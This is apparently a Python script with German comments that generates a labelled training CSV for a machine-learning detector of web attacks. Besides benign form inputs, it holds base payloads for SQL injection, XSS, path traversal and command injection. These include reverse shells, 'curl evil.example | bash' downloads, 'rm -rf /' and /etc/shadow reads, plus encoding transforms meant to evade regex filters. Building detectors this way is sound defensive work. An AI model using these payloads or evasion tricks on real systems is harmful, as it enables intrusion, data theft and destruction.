# Generiert den Trainings-Datensatz fuer den ML-Detector.
# Schritt 1: harmlose Inputs (label 0). Angriffe kommen in Schritt 2.

import csv
import os
import random

# Fester Seed -> jeder im Team bekommt exakt denselben Datensatz
random.seed(42)

# Zielgroesse pro Klasse. Angriffsseite richtet sich spaeter hieran aus.
ZIEL_PRO_KLASSE = 450


# --- Suche: breites Vokabular ueber mehrere Themenfelder ---
SUCH_BEGRIFFE = [
    # Produkt / Sales
    "firewall", "vpn zugang", "monitoring", "server status", "preisliste",
    "produkt katalog", "lizenz kaufen", "demo termin", "update 2.0", "abo verlaengern",
    "enterprise tarif", "testversion", "rabattcode", "angebot anfordern",
    # Support / Konto
    "passwort vergessen", "kontakt support", "rechnung herunterladen", "kuendigung",
    "zwei faktor", "konto loeschen", "email aendern", "support ticket status",
    # Navigation / Infos
    "datenschutz", "impressum", "stellenangebote", "team", "anleitung pdf",
    "api docs", "changelog", "haeufige fragen", "blog", "webinar anmeldung",
    # technische Suchen (Nutzer aus der IT)
    "log dateien", "backup einrichten", "ssl zertifikat", "port freigeben",
    "datenbank export", "benutzer rollen", "dashboard widgets",
]

# Begriffe die LEGITIM Sonderzeichen/Zahlen enthalten -> Schutz vor False Positives
SUCH_SPEZIAL = [
    "C++ entwickler", "naive bayes", "5 von 5 sternen", "giesserei muenchen",
    "groesse 42", "preis < 100 euro", "rabatt 20%", "firma & co. kg",
    "modell x-1000", "v1.2.3 changelog", "fuer & wider", "node.js kurs",
    "preis: 49,99 EUR", "oeffnungszeiten mo-fr", "support 24/7", "tel +49 30 123",
    "vergleich a/b test", "100% sicher", "raum 3.14", "iso 27001",
]


# --- Kontakt-Nachrichten: viele Satz-Templates ---
KONTAKT_TEMPLATES = [
    "Hallo, ich haette eine Frage zu {thema}. Koennen Sie mir helfen?",
    "Guten Tag, wann ist Ihr Support telefonisch erreichbar?",
    "Sehr geehrtes Team, das Angebot zu {thema} interessiert mich sehr.",
    "Ich moechte einen Termin fuer eine Demo vereinbaren. Geht naechste Woche?",
    "Die Rechnung Nr. 2024-1138 stimmt meiner Meinung nach nicht ganz.",
    "Funktioniert das Produkt auch unter Windows 11 & macOS?",
    "Vielen Dank fuer die schnelle Hilfe gestern - top Service!",
    "Wie kann ich mein Abo kuendigen? Die Frist ist mir unklar.",
    "Kostet das Update extra oder ist es im Preis (49,99 EUR) enthalten?",
    "Unsere Firma sucht eine Loesung fuer {thema}. Haben Sie ein Whitepaper?",
    "Leider konnte ich mich seit dem Update nicht mehr einloggen.",
    "Gibt es einen Rabatt fuer Bildungseinrichtungen / Studenten?",
    "Wo finde ich die Dokumentation zur API? Der Link auf der Seite ist tot.",
    "Bitte senden Sie mir ein Angebot fuer 25 Lizenzen an obige Adresse.",
    "Mein Konto wurde doppelt belastet - koennen Sie das pruefen?",
    "Hi Team, kurze Rueckfrage: unterstuetzt ihr auch SSO via SAML?",
]
KONTAKT_THEMEN = ["der Preisliste", "Ihrem VPN-Zugang", "dem Monitoring-Modul",
                  "der API", "den Lizenzen", "dem Support-Vertrag",
                  "dem Backup-Service", "Ihrer Cloud-Loesung", "dem Reporting"]


# --- Logins / Namen / Emails ---
VORNAMEN = ["anna", "tim", "jonas", "torben", "steve", "niklas", "jannis", "lea",
            "max", "mia", "paul", "laura", "felix", "sarah", "jan", "nina"]
NACHNAMEN = ["mueller", "schmidt", "weber", "fischer", "wagner", "becker", "koch",
             "richter", "klein", "wolf", "schroeder", "neumann"]
DOMAINS = ["gmail.com", "web.de", "firma.de", "hsmw.de", "outlook.com", "gmx.de"]


# --- Strukturierte Felder: Adressen, Bestellnr, Telefon, Datum ---
STRASSEN = ["Hauptstr.", "Bahnhofstr.", "Lindenweg", "Am Markt", "Gartenstr.", "Schulplatz"]
STAEDTE = ["Mittweida", "Chemnitz", "Dresden", "Leipzig", "Berlin", "Freiberg"]


# --- Legitime Datei-Uploads (ihr habt ein Upload-Feature!) ---
DATEI_NAMEN = [
    "bewerbung.pdf", "rechnung_2024.pdf", "lebenslauf.docx", "report-q3.xlsx",
    "logo.png", "vertrag_final.pdf", "screenshot.png", "praesentation.pptx",
    "backup_2024_06.zip", "messdaten.csv", "anleitung_v2.pdf", "foto urlaub.jpg",
]


# === Builder pro Kategorie (Single Responsibility) ========================

def _suche(eintraege):
    for s in SUCH_BEGRIFFE + SUCH_SPEZIAL:
        eintraege.add(s)
    # kombinierte Suchen (so wie User wirklich tippen)
    for _ in range(60):
        n = random.choice([2, 3])
        eintraege.add(" ".join(random.sample(SUCH_BEGRIFFE, n)))


def _kontakt(eintraege):
    for tmpl in KONTAKT_TEMPLATES:
        if "{thema}" in tmpl:
            for thema in KONTAKT_THEMEN:
                eintraege.add(tmpl.format(thema=thema))
        else:
            eintraege.add(tmpl)


def _logins(eintraege):
    for v in VORNAMEN:
        eintraege.add(v)
        eintraege.add(v + str(random.randint(1, 99)))
        eintraege.add(v + "." + random.choice(NACHNAMEN))
        eintraege.add(v + "_" + random.choice(NACHNAMEN))


def _emails(eintraege):
    for _ in range(40):
        v = random.choice(VORNAMEN)
        n = random.choice(NACHNAMEN)
        eintraege.add(f"{v}.{n}@{random.choice(DOMAINS)}")


def _strukturiert(eintraege):
    # Adressen
    for _ in range(25):
        eintraege.add(f"{random.choice(STRASSEN)} {random.randint(1, 199)}, "
                      f"{random.randint(1000, 99999)} {random.choice(STAEDTE)}")
    # Bestellnummern
    for _ in range(20):
        eintraege.add(f"Bestellung {random.randint(2020, 2026)}-{random.randint(1000, 9999)}")
    # Telefonnummern
    for _ in range(15):
        eintraege.add(f"+49 {random.randint(30, 89)} {random.randint(100000, 999999)}")
    # Datumsangaben
    for _ in range(15):
        eintraege.add(f"{random.randint(1, 28):02d}.{random.randint(1, 12):02d}.2026")


def _uploads(eintraege):
    for d in DATEI_NAMEN:
        eintraege.add(d)


def baue_harmlose():
    eintraege = set()  # set -> automatisch keine Duplikate
    _suche(eintraege)
    _kontakt(eintraege)
    _logins(eintraege)
    _emails(eintraege)
    _strukturiert(eintraege)
    _uploads(eintraege)

    # Auffuellen bis Ziel: nur ueber NEUE Kombinationen, nicht endlos doppeln
    versuche = 0
    while len(eintraege) < ZIEL_PRO_KLASSE and versuche < 5000:
        n = random.choice([2, 3, 4])
        eintraege.add(" ".join(random.sample(SUCH_BEGRIFFE, n)))
        versuche += 1

    return list(eintraege)



# === ANGRIFFE: Basis-Payloads (das was die Regex erkennt) =================

BASIS_ANGRIFFE = {
    "sqli": [
        "' OR '1'='1",
        "admin' --",
        "1' OR 1=1#",
        "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--",
        "1; SELECT * FROM information_schema.tables",
        "' OR SLEEP(5)--",
        "1 AND (SELECT 1 FROM users LIMIT 1)",
        "' UNION SELECT NULL, version()--",
        "' OR 'a'='a",
        "1' ORDER BY 10--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.cookie)>",
        "javascript:alert(1)",
        "<body onload=alert('xss')>",
        "<iframe src=javascript:alert(1)>",
        "<a href='javascript:alert(1)'>klick</a>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
    ],
    "path_traversal": [
        "../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "/var/www/../../etc/passwd",
        "../../../../proc/self/environ",
        "/etc/passwd%00.jpg",
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....\\....\\....\\windows\\win.ini",
        "/proc/self/cmdline",
        "file:///etc/passwd",
        "../../../boot.ini",
    ],
    "cmd_injection": [
        "; cat /etc/passwd",
        "| whoami",
        "&& rm -rf /",
        "$(curl http://evil.example/x)",
        "; ping -c 4 attacker.example",
        "`id`",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "; wget http://evil.example/shell.sh",
        "& net user hacker pass /add",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "|| curl evil.example/x | sh",
        "; chmod 777 /etc/shadow",
        "$(whoami)",
        "; cat /etc/shadow #",
        "; rm -rf / --no-preserve-root",
        "| base64 /etc/passwd",
        "%0a cat /etc/passwd",
        "`cat /etc/passwd`",
        "; curl http://evil.example/x | bash",
        "&& powershell -enc SQBFAFgA",
        "; echo $(id) > /tmp/out",
        "| xxd /etc/passwd",
    ],
}


# === OBFUSKATIONS-TRANSFORMS ==============================================
# Jede Funktion bekommt einen String und gibt eine obfuskierte Variante zurueck.

def t_random_case(s):
    # zufaellig Gross-/Kleinschreibung -> UNION wird zu uNiOn
    return "".join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c
                   for c in s)


def t_sql_comments(s):
    # Leerzeichen durch SQL-Inline-Kommentare ersetzen -> umgeht "UNION SELECT"-Regex
    return s.replace(" ", "/**/")


def t_url_encode(s):
    # jedes Zeichen mit 50% Wahrscheinlichkeit prozent-kodieren (partielle Evasion)
    out = []
    for c in s:
        if ord(c) < 128 and random.random() < 0.5:
            out.append("%{:02X}".format(ord(c)))
        else:
            out.append(c)
    return "".join(out)


def t_whitespace(s):
    # Leerzeichen durch andere Whitespace-Kodierungen ersetzen
    return s.replace(" ", random.choice(["\t", "%09", "%20", "+"]))

def t_double_url_encode(s):
    # nur Sonderzeichen einmal kodieren, dann %-Zeichen nochmal -> %3C wird zu %253C
    once = "".join(c if (c.isalnum() or c == " ") else "%{:02X}".format(ord(c)) for c in s)
    return once.replace("%", "%25")


def t_html_entities(s):
    # Sonderzeichen als HTML-Entities -> < wird zu &lt; , Buchstaben teils zu &#97;
    ENT = {"<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;", "'": "&#39;"}
    out = []
    for c in s:
        if c in ENT:
            out.append(ENT[c])
        elif c.isalpha() and random.random() < 0.3:
            out.append("&#{};".format(ord(c)))
        else:
            out.append(c)
    return "".join(out)


def t_hex_escape(s):
    # Zeichen als \xHH-Escape (wie in JS/Python-Strings) -> u wird zu \x75
    return "".join("\\x{:02x}".format(ord(c)) if (c.isalnum() and random.random() < 0.5) else c
                   for c in s)

# Welche Transforms passen zu welcher Kategorie
TRANSFORMS = {
    "sqli": [t_random_case, t_sql_comments, t_url_encode, t_whitespace,
             t_double_url_encode, t_hex_escape],
    "xss": [t_random_case, t_url_encode, t_whitespace,
            t_double_url_encode, t_html_entities, t_hex_escape],
    "path_traversal": [t_url_encode, t_whitespace, t_double_url_encode],
    "cmd_injection": [t_random_case, t_url_encode, t_whitespace, t_hex_escape],
}

# Struktur-Transforms veraendern den Payload, brechen aber kein Encoding.
# Wichtig fuers Stapeln: nie zwei Encodings uebereinander (gibt kaputten Muell).
STRUKTUR = [t_random_case, t_sql_comments]


def _kombiniere(basis, transforms):
    # max EIN Struktur- + EIN Encoding-Transform; erst Struktur, dann Encoding.
    # Verhindert kaputte Doppel-Encodings (z.B. URL ueber Hex).
    struktur = [t for t in transforms if t in STRUKTUR]
    encoding = [t for t in transforms if t not in STRUKTUR]
    var = basis
    if struktur and random.random() < 0.7:
        var = random.choice(struktur)(var)
    if encoding:
        var = random.choice(encoding)(var)
    return var


ZIEL_ANGRIFF_PRO_KLASSE = 120   # pro Angriffsklasse -> ausgewogene Klassen

def baue_angriffe():
    # Pro Klasse wird bis ZIEL_ANGRIFF_PRO_KLASSE aufgefuellt -> keine Klasse hungert die
    # andere aus (cmd hat mehr Basis-Payloads als path, soll aber nicht ueberwiegen).
    from collections import Counter

    eintraege = {}        # text -> (kategorie, familie)
    zaehler = Counter()   # zaehlt pro Kategorie zum gezielten Auffuellen

    def add(text, kategorie, familie):
        if text not in eintraege:
            eintraege[text] = (kategorie, familie)
            zaehler[kategorie] += 1

    for kategorie, payloads in BASIS_ANGRIFFE.items():
        transforms = TRANSFORMS[kategorie]
        for basis in payloads:                       # Originale + Einzel-Varianten
            add(basis, kategorie, basis)
            for t in transforms:
                add(t(basis), kategorie, basis)
        versuche = 0                                 # bis Klassen-Ziel auffuellen
        while zaehler[kategorie] < ZIEL_ANGRIFF_PRO_KLASSE and versuche < 4000:
            basis = random.choice(payloads)
            add(_kombiniere(basis, transforms), kategorie, basis)
            versuche += 1

    return [(text, kat, fam) for text, (kat, fam) in eintraege.items()]

def schreibe_csv(harmlos, angriffe, pfad):
    # csv-Modul -> korrektes Quoting fuer Payloads mit Komma/Quotes/Tab
    with open(pfad, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["text", "label", "familie"])   # label = Klasse (benign/sqli/...)
        for text in harmlos:
            writer.writerow([text, "benign", "benign"])
        for text, kategorie, familie in angriffe:
            writer.writerow([text, kategorie, familie])


if __name__ == "__main__":
    from collections import Counter

    harmlos = baue_harmlose()
    angriffe = baue_angriffe()

    # Pfad relativ zu DIESER Datei -> egal von wo man das Skript startet
    hier = os.path.dirname(os.path.abspath(__file__))
    daten_ordner = os.path.join(hier, "data")
    os.makedirs(daten_ordner, exist_ok=True) # legt data/ an, falls noch nicht da
    ziel = os.path.join(daten_ordner, "training_data.csv")
    schreibe_csv(harmlos, angriffe, ziel)

    verteilung = Counter(kat for _, kat, _ in angriffe)
    print(f"{'benign:':18}{len(harmlos)}")
    for kat, n in sorted(verteilung.items()):
        print(f"{kat + ':':18}{n}")
    print(f"{'Gesamt:':18}{len(harmlos) + len(angriffe)}")
    print(f"\nGeschrieben nach: {ziel}")

    print("\nStichprobe Angriffe (10 zufaellige):")
    for text, kat, fam in random.sample(angriffe, 10):
        print(f"   [{kat}] {text!r}")